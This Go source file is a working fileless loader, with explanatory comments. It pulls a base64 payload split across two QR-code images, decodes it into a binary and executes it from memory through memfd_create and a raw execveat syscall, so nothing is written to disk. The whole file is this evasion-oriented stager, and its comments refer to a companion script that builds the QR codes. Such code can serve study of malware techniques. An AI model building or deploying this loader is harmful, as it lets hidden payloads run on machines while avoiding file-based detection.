package main

import (
	"encoding/base64"
	"fmt"
	"image"
	_"image/png"
	_"io/ioutil"
	"os"
	"unsafe"

	"golang.org/x/sys/unix"

	"github.com/makiuchi-d/gozxing"
	"github.com/makiuchi-d/gozxing/qrcode"
)

// AT_EMPTY_PATH is the flag telling execveat to use the FD even if the path is "".
const AT_EMPTY_PATH = 0x1000

// decodeQRCode decodes a QR code from an image file and returns the decoded text.
func decodeQRCode(filename string) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()

	img, _, err := image.Decode(file)
	if err != nil {
		return "", err
	}

	bmp, err := gozxing.NewBinaryBitmapFromImage(img)
	if err != nil {
		return "", err
	}

	qrReader := qrcode.NewQRCodeReader()
	result, err := qrReader.Decode(bmp, nil)
	if err != nil {
		return "", err
	}

	return result.GetText(), nil
}

// executeBinaryInMemory executes the given binary data in memory. The code below uses memfdcreate from the go unix library and creates the memory file "memexec". The flag 0 means that no special flags have been set. 
func executeBinaryInMemory(binaryData []byte) error {
	fd, err := unix.MemfdCreate("memexec", 0)
	if err != nil {
		return fmt.Errorf("MemfdCreate error: %v", err)
	}
	defer unix.Close(fd)
	// The code here specifically "unix.Write(fd, binaryData)" then writes the binary into the memfd file using fd (file discriptor) (which we created using memfd_create).
	n, err := unix.Write(fd, binaryData)
	if err != nil || n != len(binaryData) {
		return fmt.Errorf("Write error: %v (wrote %d of %d)", err, n, len(binaryData))
	}

	if off, err := unix.Seek(fd, 0, 0); err != nil || off != 0 {
		return fmt.Errorf("Seek error: %v", err)
	}

	argv := []string{"memexec_binary"}
	envp := os.Environ()

	return execveatEmptyPath(fd, argv, envp)
	// The above code creates argv which is just a placeholder for the memexec_binary.
//envp obtains the environment variables from os.Environ().
}

// execveatEmptyPath calls execveat(fd, "", argv, envp, AT_EMPTY_PATH).
func execveatEmptyPath(fd int, argv []string, envp []string) error {
	// In the above code, what we are doing is passing in the file descriptor, argv and envp.
	argvPtrs := make([]*byte, len(argv)+1)
	for i, s := range argv {
		cstr, err := unix.BytePtrFromString(s)
		if err != nil {
			return fmt.Errorf("invalid argv string %q: %w", s, err)
		}
		argvPtrs[i] = cstr
	}
	//The function then inits a slice called argvPtrs to store c-style string pointers since syscalls in C want argv's to be arrays of C strings. 
	envpPtrs := make([]*byte, len(envp)+1)
	for i, e := range envp {
		cstr, err := unix.BytePtrFromString(e)
		if err != nil {
			return fmt.Errorf("invalid env string %q: %w", e, err)
		}
		envpPtrs[i] = cstr
	}
	//The for loop then converts each string in argv and returns an error if there are any invalid strings.To ensure a slice is terminated with a nil pointer we use (len(argv)+1)
	
	emptyStringPtr, _ := unix.BytePtrFromString("")

	const SYS_EXECVEAT = unix.SYS_EXECVEAT
	r1, _, e := unix.Syscall6(
		SYS_EXECVEAT,
		uintptr(fd),
		uintptr(unsafe.Pointer(emptyStringPtr)),
		uintptr(unsafe.Pointer(&argvPtrs[0])),
		uintptr(unsafe.Pointer(&envpPtrs[0])),
		uintptr(AT_EMPTY_PATH),
		0,
	)
	if e != 0 {
		return e
	}
	if r1 != 0 {
		return fmt.Errorf("execveat returned %d unexpectedly", r1)
	}
	return nil

// SYS_EXECVEAT, --> This is the syscall
// uintptr(fd), --> passing in the file descriptor
// uintptr(unsafe.Pointer(emptyStringPtr)), --> The path here is empty because we are using the AT_EMPTY_PATH (refer to the man page)
// uintptr(unsafe.Pointer(&argvPtrs[0])), --> pointer to argv arr
// uintptr(unsafe.Pointer(&envpPtrs[0])), --> pointer to envp arr
// uintptr(AT_EMPTY_PATH), // AT_EMPTY_PATH to use execveat with fd
// 0, --> we did not need to use this

}
// Simple what happens here. Refer to alltogetherfinalshell to see how QR code is put together using recursion. Decode QR code then execute binary in memory. 
func main() {
	decodedPart1, err := decodeQRCode("./images/basic_qrcode_part_1.png")
	if err != nil {
		fmt.Println("Error decoding QR code part 1:", err)
		return
	}

	decodedPart2, err := decodeQRCode("./images/basic_qrcode_part_2.png")
	if err != nil {
		fmt.Println("Error decoding QR code part 2:", err)
		return
	}

	combinedBase64 := decodedPart1 + decodedPart2
	decodedBytes, err := base64.StdEncoding.DecodeString(combinedBase64)
	if err != nil {
		fmt.Println("Error decoding base64:", err)
		return
	}

	err = executeBinaryInMemory(decodedBytes)
	if err != nil {
		fmt.Println("Error executing binary in memory:", err)
		return
	}

	fmt.Println("Binary executed successfully in memory.")
}
